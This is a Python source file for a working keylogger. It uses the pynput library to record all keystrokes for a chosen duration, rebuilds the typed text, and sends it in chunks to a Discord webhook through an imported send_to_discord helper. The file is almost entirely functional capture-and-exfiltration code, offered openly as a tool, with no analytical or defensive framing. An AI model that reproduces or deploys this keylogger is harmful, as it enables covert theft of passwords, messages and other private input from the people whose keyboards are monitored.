#!/usr/bin/env python3
"""
Simple Keylogger
Records keystrokes for a specified duration
Requires: pip install pynput
"""

import sys
import os
import time
from datetime import datetime

# Add parent directory to path
sys.path.insert(0, os.path.dirname(__file__))
try:
    from webhook_utils import send_to_discord
    WEBHOOK_AVAILABLE = True
except ImportError:
    WEBHOOK_AVAILABLE = False

class KeyLogger:
    def __init__(self, duration=60):
        self.duration = duration
        self.log = []
        self.start_time = None
        
    def on_press(self, key):
        """Called when a key is pressed"""
        try:
            # Check if duration exceeded
            if time.time() - self.start_time > self.duration:
                return False  # Stop listener
            
            timestamp = datetime.now().strftime("%H:%M:%S")
            
            # Handle different key types
            try:
                key_char = key.char
                self.log.append(key_char)
                print(key_char, end='', flush=True)
            except AttributeError:
                # Special keys
                key_name = str(key).replace('Key.', '')
                
                if key_name == 'space':
                    self.log.append(' ')
                    print(' ', end='', flush=True)
                elif key_name == 'enter':
                    self.log.append('\n')
                    print()
                elif key_name == 'backspace':
                    if self.log:
                        self.log.pop()
                    print('\b \b', end='', flush=True)
                else:
                    self.log.append(f'[{key_name}]')
                    print(f'[{key_name}]', end='', flush=True)
        
        except Exception as e:
            pass
        
        return True
    
    def start(self):
        """Start keylogging"""
        try:
            from pynput import keyboard
        except ImportError:
            print("ERROR: pynput not installed")
            print("Install with: pip install pynput")
            return []
        
        print("=" * 60)
        print("KEYLOGGER")
        print("=" * 60)
        print(f"\nRecording keystrokes for {self.duration} seconds...")
        print("Start typing (output shown below):\n")
        print("-" * 60)
        
        self.start_time = time.time()
        
        # Start listener
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()
        
        print("\n" + "-" * 60)
        print(f"\nRecording complete. Captured {len(self.log)} keystrokes.")
        print("=" * 60)
        
        return self.log

def main():
    # Default: record for 60 seconds
    duration = 60
    
    if len(sys.argv) > 1:
        try:
            duration = int(sys.argv[1])
        except ValueError:
            print("Usage: python keylogger.py [duration_in_seconds]")
            sys.exit(1)
    
    keylogger = KeyLogger(duration)
    captured_keys = keylogger.start()
    
    if captured_keys:
        # Join keys into string
        logged_text = ''.join(captured_keys)
        
        # Send to Discord
        if WEBHOOK_AVAILABLE and logged_text.strip():
            print("\nSending keylog data to Discord...")
            
            # Split into chunks if too long
            chunk_size = 1900
            chunks = [logged_text[i:i+chunk_size] 
                     for i in range(0, len(logged_text), chunk_size)]
            
            for i, chunk in enumerate(chunks[:5], 1):  # Limit to 5 chunks
                title = f"Keylog Captured (Part {i}/{len(chunks)})" if len(chunks) > 1 else "Keylog Captured"
                message = f"**Duration:** {duration}s\n**Keystrokes:** {len(captured_keys)}\n\n```\n{chunk}\n```"
                
                success = send_to_discord(title, message)
                
                if success:
                    print(f"✓ Part {i} sent to Discord")
                else:
                    print(f"✗ Failed to send part {i} to Discord")
                
                time.sleep(1)  # Avoid rate limiting
            
            if len(chunks) > 5:
                print(f"\n⚠️  Only sent first 5 chunks ({len(chunks)} total)")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nKeylogger stopped by user.")
